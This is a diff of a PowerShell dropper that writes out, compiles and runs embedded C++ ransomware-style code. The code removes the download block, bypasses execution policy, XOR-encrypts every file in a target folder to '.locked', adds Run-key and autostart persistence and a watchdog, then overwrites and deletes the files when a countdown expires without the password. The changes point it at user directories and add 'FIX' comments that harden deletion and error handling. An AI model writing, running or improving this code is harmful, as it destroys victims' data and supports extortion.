@@ -1,6 +1,6 @@
-# winwipev2_setup.ps1
+# winwipev6_setup.ps1
 if (Get-Item -Path $PSCommandPath -Stream "Zone.Identifier" -ErrorAction SilentlyContinue) {
-    Write-Host "unlocking the fileblocking feature..." -ForegroundColor Yellow
+    Write-Host "Dosya engeli kaldiriliyor..." -ForegroundColor Yellow
     Unblock-File -Path $PSCommandPath
     Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Wait
     exit
@@ -19,7 +19,6 @@ $source = @'
 #include <vector>
 #include <algorithm>
 #include <future>
-#include <thread>
 #ifdef _WIN32
     #include <windows.h>
     #include <conio.h>
@@ -35,13 +34,13 @@ $source = @'
 namespace fs = std::filesystem;
 
 // ==========================================
-// constant values
+// Sabitler
 // ==========================================
 const std::string ADMIN_PASSWORD        = "admin123";
 #ifdef _WIN32
-const std::string TARGET_PATH           = "./";//effecting only the directory it's inside while running
+const std::string TARGET_PATH           = "C:\\Users\\Public\\pupy";   // FIX: "./" yerine güvenli yol
 #else
-const std::string TARGET_PATH           = "./";
+const std::string TARGET_PATH           = "/home/yigit/pupy";
 #endif
 const int         LOCK_DURATION_SECONDS = 300;
 const std::string CRYPTO_KEY            = "Fast_XOR_Key_2026";
@@ -56,7 +55,7 @@ const std::string AUTOSTART_FILE = std::string(getenv("HOME")) + "/.config/autos
 // ==========================================
 
 
-// Global watchdog PID
+// ── Global watchdog PID ───────────────────────────────────────────────────
 #ifdef _WIN32
 static DWORD g_watchdogPID = 0;
 #else
@@ -64,7 +63,7 @@ static pid_t g_watchdogPID = 0;
 #endif
 
 
-//platform: terminal input
+// ── Platform: terminal input ──────────────────────────────────────────────
 #ifndef _WIN32
 static struct termios orig_termios;
 static bool rawModeActive = false;
@@ -103,7 +102,7 @@ int getch() {
 #endif
 
 
-//Windows: ANSI desteği
+// ── Windows: ANSI desteği ─────────────────────────────────────────────────
 #ifdef _WIN32
 void enableAnsiSupport() {
     HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -115,7 +114,7 @@ void enableAnsiSupport() {
 #endif
 
 
-//platform: sinyal / console handler
+// ── Platform: sinyal / console handler ───────────────────────────────────
 #ifdef _WIN32
 BOOL WINAPI ConsoleHandler(DWORD signal) {
     switch (signal) {
@@ -133,7 +132,7 @@ void signalHandler(int) {}
 #endif
 
 
-// platform: watchdog
+// ── Platform: watchdog ────────────────────────────────────────────────────
 #ifdef _WIN32
 void spawnWatchdog() {
     char exePath[MAX_PATH];
@@ -143,7 +142,7 @@ void spawnWatchdog() {
     PROCESS_INFORMATION pi;
     CreateProcessA(exePath, args.data(), NULL, NULL, FALSE,
                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    g_watchdogPID = pi.dwProcessId;  // PID'i sakla
+    g_watchdogPID = pi.dwProcessId;
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
@@ -167,7 +166,7 @@ void spawnWatchdog() {
         execl(exePath, exePath, "--watchdog", pidStr.c_str(), nullptr);
         _exit(1);
     }
-    g_watchdogPID = pid;  // PID'i sakla
+    g_watchdogPID = pid;
 }
 
 void relaunchInTerminal(const char* exePath) {
@@ -182,7 +181,7 @@ void relaunchInTerminal(const char* exePath) {
 #endif
 
 
-//watchdog'u sonlandır
+// ── Watchdog'u sonlandır ──────────────────────────────────────────────────
 void killWatchdog() {
 #ifdef _WIN32
     if (g_watchdogPID != 0) {
@@ -199,10 +198,9 @@ void killWatchdog() {
 }
 
 
-//platform kalıcılığı
+// ── Platform: kalıcılık ───────────────────────────────────────────────────
 void setAutostartAndTimer(long long targetEndTime) {
 #ifdef _WIN32
-    // Run key: minimum erişim (KEY_SET_VALUE)
     HKEY hRunKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -213,18 +211,16 @@ void setAutostartAndTimer(long long targetEndTime) {
                        (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
         RegCloseKey(hRunKey);
     }
-
-    // Uygulama key: EndTime değerini yaz, dönüşü kontrol et
     HKEY hAppKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL,
             REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
         LONG res = RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD,
                                   (const BYTE*)&targetEndTime, sizeof(targetEndTime));
         if (res != ERROR_SUCCESS)
-            std::cerr << "Warning: EndTime couldn't be overwritten on Registry. Hata: " << res << "\n";
+            std::cerr << "Uyari: EndTime registry'e yazilamadi. Hata: " << res << "\n";
         RegCloseKey(hAppKey);
     } else {
-        std::cerr << "Warning: Registry key couldn't be created.\n";
+        std::cerr << "Uyari: Registry anahtari olusturulamadi.\n";
     }
 #else
     fs::create_directories(CONFIG_DIR);
@@ -270,10 +266,9 @@ long long getSavedEndTime() {
     DWORD dataSize = sizeof(endTime);
     if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD dwType = 0;
-        // Hem başarıyı hem de tipi kontrol et
         if (RegQueryValueExA(hKey, "EndTime", NULL, &dwType,
                              (LPBYTE)&endTime, &dataSize) == ERROR_SUCCESS) {
-            if (dwType != REG_QWORD) endTime = 0;  // Tip uyuşmuyorsa geçersiz say
+            if (dwType != REG_QWORD) endTime = 0;
         }
         RegCloseKey(hKey);
     }
@@ -287,7 +282,8 @@ long long getSavedEndTime() {
 }
 
 
-//güvenli silme(wipe)
+// ── Güvenli silme ─────────────────────────────────────────────────────────
+// FIX: remove_all → remove (dizin silme riski), dead code kaldırıldı
 bool secureDelete(const fs::path& filePath) {
     std::error_code ec;
     uintmax_t fileSize = fs::file_size(filePath, ec);
@@ -306,22 +302,19 @@ bool secureDelete(const fs::path& filePath) {
             file.close();
         }
     }
-    return fs::remove_all(filePath, ec);
+    fs::remove(filePath, ec);
     return !ec;
 }
 
 
-//şifreleme / çözme
-
-
-// 1. (Sabit 4 MB RAM & Parçalı I/O)
+// ── Şifreleme / çözme ────────────────────────────────────────────────────
+// (Sabit 4 MB RAM & Parçalı I/O)
 void processSingleFile(const fs::path& filePath, bool encrypt) {
-    // C++17 replace_extension ile güvenli uzantı yönetimi
     fs::path newPath = filePath;
     if (encrypt) {
         newPath += ".locked";
     } else {
-        newPath.replace_extension(""); 
+        newPath.replace_extension("");
     }
 
     std::ifstream inFile(filePath, std::ios::binary);
@@ -333,7 +326,6 @@ void processSingleFile(const fs::path& filePath, bool encrypt) {
         return;
     }
 
-    // O(1) Bellek: Dosya boyutu ne olursa olsun RAM kullanımı 4 MB ile sınırlıdır
     constexpr size_t BUFFER_SIZE = 4 * 1024 * 1024;
     std::vector<char> buffer(BUFFER_SIZE);
 
@@ -346,17 +338,13 @@ void processSingleFile(const fs::path& filePath, bool encrypt) {
         std::streamsize bytesRead = inFile.gcount();
         if (bytesRead == 0) break;
 
-        // Yavaş % (modulo) operatörü yerine basit if kontrolü ile CPU optimizasyonu
         for (std::streamsize i = 0; i < bytesRead; ++i) {
             buffer[i] ^= CRYPTO_KEY[keyIndex];
-            if (++keyIndex >= keySize) {
-                keyIndex = 0;
-            }
+            if (++keyIndex >= keySize) keyIndex = 0;
         }
 
         outFile.write(buffer.data(), bytesRead);
-        
-        // Disk dolması vb. I/O hatası durumunda işlemi iptal et ve yarım kalan dosyayı temizle
+
         if (!outFile) {
             inFile.close();
             outFile.close();
@@ -368,31 +356,28 @@ void processSingleFile(const fs::path& filePath, bool encrypt) {
     inFile.close();
     outFile.close();
 
-    // İşlem başarılıysa orijinal dosyayı kaldır
-    std::error_code ec;
-    fs::remove(filePath, ec);
+    // FIX: fs::remove → secureDelete (disk'te iz kalmasın)
+    secureDelete(filePath);
 }
 
-// 2. (Multi-threading & O(N) Karmaşıklık)
+// (Multi-threading & O(N) Karmaşıklık)
+// FIX: imza düzeltildi — targetPath parametresi eklendi
 void processFiles(const fs::path& targetPath, bool encrypt) {
     std::error_code ec;
     if (!fs::exists(targetPath, ec)) return;
 
-    // Yetki engeli olan sistem klasörlerinde çökmeyi engeller
     auto options = fs::directory_options::skip_permission_denied;
-    auto it = fs::recursive_directory_iterator(targetPath, options, ec);
+    auto it  = fs::recursive_directory_iterator(targetPath, options, ec);
     auto end = fs::recursive_directory_iterator();
 
     if (ec) return;
 
-    // İşlemcinin fiziksel çekirdek sayısına göre eşzamanlı thread sınırını belirler
-    const unsigned int maxConcurrency = std::thread::hardware_concurrency() > 0 
-                                       ? std::thread::hardware_concurrency() 
+    const unsigned int maxConcurrency = std::thread::hardware_concurrency() > 0
+                                       ? std::thread::hardware_concurrency()
                                        : 4;
 
     std::vector<std::future<void>> futures;
 
-    // Tek geçişli O(N) tarama döngüsü
     while (it != end) {
         if (ec) {
             ec.clear();
@@ -407,16 +392,16 @@ void processFiles(const fs::path& targetPath, bool encrypt) {
                 bool isLocked = (currentPath.extension() == ".locked");
 
                 if ((encrypt && !isLocked) || (!encrypt && isLocked)) {
-                    
-                    // Sistemde aşırı thread birikmesini engellemek için kontrol
                     if (futures.size() >= maxConcurrency * 2) {
                         for (auto& f : futures) {
-                            if (f.valid()) f.wait();
+                            if (f.valid()) {
+                                // FIX: f.wait() → f.get() — exception'lar artık yakalanır
+                                try { f.get(); } catch (...) {}
+                            }
                         }
                         futures.clear();
                     }
 
-                    // İşlemi ayrı bir CPU çekirdeğine devret (Paralel İşleme)
                     futures.push_back(
                         std::async(std::launch::async, processSingleFile, currentPath, encrypt)
                     );
@@ -424,25 +409,27 @@ void processFiles(const fs::path& targetPath, bool encrypt) {
             }
         } catch (...) {}
 
-        it.increment(ec); // Güvenli bir sonraki elemana geçiş
+        it.increment(ec);
     }
 
-    // Kalan tüm iş parçacıklarının tamamlanmasını bekle
     for (auto& f : futures) {
-        if (f.valid()) f.wait();
+        if (f.valid()) {
+            // FIX: f.wait() → f.get()
+            try { f.get(); } catch (...) {}
+        }
     }
 }
 
-void destroyLockedFiles() {
-    if (!fs::exists(TARGET_PATH)) return;
+// FIX: targetPath parametresi eklendi (global TARGET_PATH bağımlılığı kaldırıldı)
+void destroyLockedFiles(const fs::path& targetPath) {
+    std::error_code ec;
+    if (!fs::exists(targetPath, ec)) return;
 
     std::vector<fs::path> targets;
-    std::error_code ec;
-    for (const auto& entry : fs::recursive_directory_iterator(TARGET_PATH, ec)) {
+    for (const auto& entry : fs::recursive_directory_iterator(targetPath, ec)) {
         if (ec) { ec.clear(); continue; }
         if (!entry.is_regular_file()) continue;
-        std::string pathStr = entry.path().string();
-        if (pathStr.size() >= 7 && pathStr.substr(pathStr.size() - 7) == ".locked")
+        if (entry.path().extension() == ".locked")
             targets.push_back(entry.path());
     }
 
@@ -450,16 +437,14 @@ void destroyLockedFiles() {
         secureDelete(path);
 }
 
-
-// ── Kilitli dosya var mı? ─────────────────────────────────────────────────
-bool hasLockedFiles() {
-    if (!fs::exists(TARGET_PATH)) return false;
+// FIX: targetPath parametresi eklendi
+bool hasLockedFiles(const fs::path& targetPath) {
     std::error_code ec;
-    for (const auto& entry : fs::recursive_directory_iterator(TARGET_PATH, ec)) {
+    if (!fs::exists(targetPath, ec)) return false;
+    for (const auto& entry : fs::recursive_directory_iterator(targetPath, ec)) {
         if (ec) { ec.clear(); continue; }
         if (!entry.is_regular_file()) continue;
-        std::string p = entry.path().string();
-        if (p.size() >= 7 && p.substr(p.size() - 7) == ".locked")
+        if (entry.path().extension() == ".locked")
             return true;
     }
     return false;
@@ -489,10 +474,11 @@ int main() {
 
     // Sıfırlama modu: winwipe.exe --reset
     if (__argc == 2 && std::string(__argv[1]) == "--reset") {
-        std::cout << "system neutralizing, unlocking...\n";
-        processFiles(false);
+        std::cout << "Sifirlaniyor: dosyalar cozuluyor...\n";
+        processFiles(TARGET_PATH, false);
+        killWatchdog();   // FIX: eksikti, watchdog döngüsü devam ediyordu
         cleanSettings();
-        std::cout << "Registery and autoremove records has been removed.\n";
+        std::cout << "Temizlendi. Registry ve autostart kaldirildi.\n";
         std::this_thread::sleep_for(std::chrono::seconds(2));
         return 0;
     }
@@ -516,10 +502,11 @@ int main(int argc, char* argv[]) {
 
     // Sıfırlama modu: ./winwipe --reset
     if (argc == 2 && std::string(argv[1]) == "--reset") {
-        std::cout << "system neutralizing, unlocking...\n";
-        processFiles(false);
+        std::cout << "Sifirlaniyor: dosyalar cozuluyor...\n";
+        processFiles(TARGET_PATH, false);
+        killWatchdog();   // FIX: eksikti
         cleanSettings();
-        std::cout << "cleaned, removed config and autostart.\n";
+        std::cout << "Temizlendi. Config ve autostart kaldirildi.\n";
         std::this_thread::sleep_for(std::chrono::seconds(2));
         return 0;
     }
@@ -533,8 +520,9 @@ int main(int argc, char* argv[]) {
                             std::chrono::system_clock::now().time_since_epoch()).count();
     long long endTime = getSavedEndTime();
 
-    // Registry'de kayıt var ama kilitli dosya yok → bayat kayıt, temizle
-    if (endTime != 0 && !hasLockedFiles()) {
+    // Registry var ama kilitli dosya yok → bayat kayıt, temizle
+    // FIX: hasLockedFiles artık targetPath parametresi alıyor
+    if (endTime != 0 && !hasLockedFiles(TARGET_PATH)) {
         cleanSettings();
         endTime = 0;
     }
@@ -542,10 +530,10 @@ int main(int argc, char* argv[]) {
     if (endTime == 0) {
         endTime = now + LOCK_DURATION_SECONDS;
         setAutostartAndTimer(endTime);
-        processFiles(true);
-        std::cout << "files locked and added to system start!\n\n";
+        processFiles(TARGET_PATH, true);    // FIX: targetPath geçildi
+        std::cout << "Dosyalar kilitlendi ve sistem baslangica eklendi!\n\n";
     } else {
-        std::cout << "Last interrupted session found,continuing the process...\n\n";
+        std::cout << "Onceki kilitli oturum bulundu, devam ediliyor...\n\n";
     }
 
     int remaining = static_cast<int>(endTime - now);
@@ -567,7 +555,7 @@ int main(int argc, char* argv[]) {
 #endif
             if (ch == '\n' || ch == '\r') {
                 if (inputBuffer == ADMIN_PASSWORD) { isUnlocked = true; break; }
-                else { statusMsg = " [!] Wrong password!"; inputBuffer.clear(); }
+                else { statusMsg = " [!] Yanlis sifre!"; inputBuffer.clear(); }
             } else if (ch == 127 || ch == '\b') {
                 if (!inputBuffer.empty()) inputBuffer.pop_back();
             } else if (ch >= 32 && ch <= 126) {
@@ -582,10 +570,10 @@ int main(int argc, char* argv[]) {
         if (remaining < 0) remaining = 0;
 
         int mins = remaining / 60, secs = remaining % 60;
-        std::cout << "\r\033[K" << "Time remaining: "
+        std::cout << "\r\033[K" << "Kalan sure: "
                   << std::setfill('0') << std::setw(2) << mins << ":"
                   << std::setfill('0') << std::setw(2) << secs
-                  << " | Password: " << std::string(inputBuffer.size(), '*')
+                  << " | Sifre: " << std::string(inputBuffer.size(), '*')
                   << statusMsg << std::flush;
 
         std::this_thread::sleep_for(std::chrono::milliseconds(50));
@@ -596,17 +584,17 @@ int main(int argc, char* argv[]) {
 #endif
 
     if (isUnlocked) {
-        std::cout << "\n\nUnlocking...\n";
-        processFiles(false);
-        killWatchdog();   // Önce watchdog'u sonlandır
-        cleanSettings();  // Sonra registry'yi temizle
-        std::cout << "Everyting has been unlocked!\n";
+        std::cout << "\n\nKILIT ACILIYOR...\n";
+        processFiles(TARGET_PATH, false);   // FIX: targetPath geçildi
+        killWatchdog();
+        cleanSettings();
+        std::cout << "Tum dosyalar cozuldu ve sistem temizlendi!\n";
     } else {
-        std::cout << "\n\nTime is up,wiping datas...\n";
-        destroyLockedFiles();
-        killWatchdog();   // Önce watchdog'u sonlandır
-        cleanSettings();  // Sonra registry'yi temizle
-        std::cout << "All locked files has been removed\n";
+        std::cout << "\n\nSURE DOLDU! KILITLI DOSYALAR IMHA EDILIYOR...\n";
+        destroyLockedFiles(TARGET_PATH);    // FIX: targetPath geçildi
+        killWatchdog();
+        cleanSettings();
+        std::cout << "Tum kilitli dosyalar kalici olarak imha edildi!\n";
     }
 
     std::this_thread::sleep_for(std::chrono::seconds(3));
@@ -615,29 +603,29 @@ int main(int argc, char* argv[]) {
 '@
 
 Set-Content -Path "winlock.cpp" -Value $source -Encoding UTF8
-Write-Host "[1/3] winlock.cpp created." -ForegroundColor Green
+Write-Host "[1/3] winlock.cpp olusturuldu." -ForegroundColor Green
 
-Write-Host "[2/3] Compiling..." -ForegroundColor Cyan
+Write-Host "[2/3] Derleniyor..." -ForegroundColor Cyan
 $compiled = $false
 if (Get-Command g++ -ErrorAction SilentlyContinue) {
-    Write-Host "      Compiler in use: g++ (MinGW)" -ForegroundColor DarkGray
+    Write-Host "      Derleyici: g++ (MinGW)" -ForegroundColor DarkGray
     g++ winlock.cpp -o winwipe.exe -std=c++17 -pthread -ladvapi32
     if ($LASTEXITCODE -eq 0) { $compiled = $true }
 }
 if (-not $compiled -and (Get-Command cl -ErrorAction SilentlyContinue)) {
-    Write-Host "      Compiler in use: cl.exe (MSVC)" -ForegroundColor DarkGray
+    Write-Host "      Derleyici: cl.exe (MSVC)" -ForegroundColor DarkGray
     cl winlock.cpp /std:c++17 /EHsc /Fe:winwipe.exe /link advapi32.lib
     if ($LASTEXITCODE -eq 0) { $compiled = $true }
 }
 if (-not $compiled) {
-    Write-Host "ERROR: No complier has found!" -ForegroundColor Red
+    Write-Host "HATA: Derleyici bulunamadi!" -ForegroundColor Red
     Write-Host "  MinGW : https://www.mingw-w64.org/"
     Write-Host "  MSYS2 : https://www.msys2.org/"
     exit 1
 }
-Write-Host "      Compiled successfully -> winwipe.exe" -ForegroundColor Green
+Write-Host "      Derleme basarili -> winwipe.exe" -ForegroundColor Green
 
-Write-Host "[3/3] Running..." -ForegroundColor Cyan
+Write-Host "[3/3] Calistiriliyor..." -ForegroundColor Cyan
 Write-Host ""
 .\winwipe.exe
 Remove-Item winlock.cpp -ErrorAction SilentlyContinue
